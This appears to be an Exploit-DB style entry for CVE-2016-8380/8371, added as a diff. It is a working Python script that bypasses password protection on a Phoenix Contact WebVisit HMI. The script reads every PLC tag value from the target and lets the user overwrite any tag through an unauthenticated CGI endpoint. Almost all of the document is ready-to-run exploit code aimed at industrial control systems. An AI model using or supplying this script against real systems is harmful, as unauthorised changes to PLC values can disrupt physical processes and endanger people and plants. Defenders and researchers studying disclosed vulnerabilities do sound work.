@@ -1,0 +1,93 @@
+# Exploit Title: Phoenix Contact WebVisit 2985725 - Authentication Bypass
+# Date: 2018-09-30
+# Exploit Author: Deneut Tijl
+# Vendor Homepage: www.phoenixcontact.com
+# Software Link: https://www.phoenixcontact.com/online/portal/nl/?uri=pxc-oc-itemdetail:pid=2985725&library=nlnl&pcck=P-19-05-01&tab=5
+# Version: WebVisit (all versions)
+# CVE : CVE-2016-8380, CVE-2016-8371
+
+# Description
+# Script to read and write PLC tags via a Webvisit HMI page (even in case of a password protection)
+# Steps:
+# * Get Project Name: http://<ip>/
+# * Get list of tags: http://<ip>/<projectname>.tcr
+# * Get current values of tags: http://<ip>/cgi-bin/ILRReadValues.exe
+# * Set new tag values: http://<ip>/cgi-bin/writeVal.exe?<tag>+<value> (urlencode!)
+
+# CVE-2016-8380-SetPLCValues.py
+
+#! /usr/bin/env python
+
+import urllib2
+
+strIP = raw_input('Please enter an IP [192.168.1.200]: ')
+if strIP == '': strIP = '192.168.1.200'
+
+try:
+    URLResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/'))
+except urllib2.HTTPError:
+    print('#### Critical Error with IP ' + strIP + ': no response')
+    raw_input('Press Enter to exit')
+    exit()
+
+strProject = ''
+for line in URLResponse.readlines():
+    if 'ProjectName' in line:
+        strProject = line.split('VALUE="')[1].split('"')[0]
+
+if strProject == '':
+    print('#### Error, no \'ProjectName\' found on the main page')
+    raw_input('Press Enter to exit')
+    exit()
+
+print('---- Found project \'' + strProject + '\', retrieving list of tags')
+
+try:
+    TagResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/' + strProject + '.tcr'))
+except urllib2.HTTPError:
+    print('#### Critical Error with IP ' + strIP + ': /' + strProject + '.tcr not found')
+    raw_input('Press Enter to exit')
+    exit()
+
+arrTagList = []
+for line in TagResponse.readlines():
+    if line.startswith('#!-- N ='):
+        intNumberOfTags = int(line.split('=')[1])
+        print('---- There should be ' + str(intNumberOfTags) + ' tags:')
+    if not line.startswith('#'):
+        if not line.split(';')[0].strip() == '':
+            arrTagList.append(line.split(';')[0].strip())
+            print('-- '+line.split(';')[0].strip())
+
+
+raw_input('Press Enter to query them all')
+import os, urllib
+os.system('cls' if os.name == 'nt' else 'clear')
+strPost = '<body>'
+strPost += '<item_list_size>' + str(len(arrTagList)) + '</item_list_size>'
+strPost += '<item_list>'
+for item in arrTagList:
+    strPost += '<i><n>' + item + '</n></i>'
+strPost += '</item_list></body>'
+DataResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/cgi-bin/ILRReadValues.exe', strPost)).read()
+
+arrData = []
+for item in DataResponse.split('<i>'):
+    if '<n>' in item:
+        name = item.split('<n>')[1].split('</n>')[0]
+        value = item.split('<v>')[1].split('</v>')[0]
+        arrData.append((name,value))
+print('----- Full list of tags and their values:')
+i = 0
+for item in arrData:
+    i += 1
+    print(str(i) + ': Tag ' + item[0] + ' has value: ' + item[1])
+
+ans1 = raw_input('Want to change a tag? Enter a number or press Enter to quit: ')
+if ans1 == '':
+    exit()
+strTag = arrData[int(ans1) - 1][0]
+strVal = arrData[int(ans1) - 1][1]
+ans2 = raw_input('Setting value for ' + strTag + ' [' + strVal + ']: ')
+if ans2 == '': ans2 = strVal
+urllib2.urlopen(urllib2.Request('http://' + strIP + '/cgi-bin/writeVal.exe?' + urllib.quote_plus(strTag) + '+' + str(ans2)))
